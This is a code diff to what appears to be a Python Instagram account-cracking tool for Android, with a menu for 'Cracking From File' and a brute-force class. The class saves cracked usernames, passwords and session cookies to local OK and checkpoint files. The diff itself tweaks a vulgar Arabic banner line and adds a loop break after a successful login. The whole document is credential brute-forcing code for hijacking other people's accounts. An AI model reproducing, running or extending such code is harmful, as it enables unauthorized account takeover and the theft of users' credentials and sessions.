@@ -204,7 +204,7 @@ def Menu():
 \033[1;35m       ____𓆩Atef Ben Amor & Rayen Gamoudi & wissem Akoudi𓆪____\n
 \033[1;33m                  ____Well Come To 𝐓𝐄𝐀𝐌 <> 𝐀𝐑𝐖 ____
 \n\033[1;00m''')
-        Console().print(f'\n   اي تهبط&نيك زبي &عصبة لتونس كاملة# ')
+        Console().print(f'\n   بيع وروح$اي تهبط&نيك زبي &عصبة لتونس كاملة# ')
         Console().print(f'\n [1]. 𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠 𝐅𝐫𝐨𝐦 𝐅𝐢𝐥𝐞\n')
         Console().print(f'\n [2]. 𝐃𝐮𝐦𝐩 𝐅𝐢𝐥𝐞 𝐋𝐢𝐬𝐭 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 (soon)\n')
         choice = Console().input(' [?]   ➛  ')
@@ -525,6 +525,7 @@ class Brute:
                             open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-OK.txt', 'a').write(f'{user}|{pswd}\n{cookie}\n')
                             console.print(f"\r [bold green]         𖣘─────────────────━﴾𓆩OK𓆪﴿━─────────────────𖣘            \n[bold green]           ├ {user} | {pswd}\n[bold green]           ├ OK:{B2} {self.ok}\n[bold green][🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──>{B2} {cookie}\n")
                             cek_DYNO(user, cookie_file_path)
+                            break
 
                 
                  elif 'two_factor_required' in str(response.text):
@@ -538,7 +539,6 @@ class Brute:
                     open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-CP.txt', 'a').write(f'{user}|{pswd}\n')
                     console.print(f"\r {K2}         𖣘─────────────────━﴾𓆩CP𓆪﴿━─────────────────𖣘            \n[bold yellow]           ├ {user} | {pswd}\n[bold yellow]           ├ CP:{B2} {self.cp}\n")
                     cek_DYNO(user, cookie_file_path)
-
                     break
 
             except requests.exceptions.ConnectionError as e:
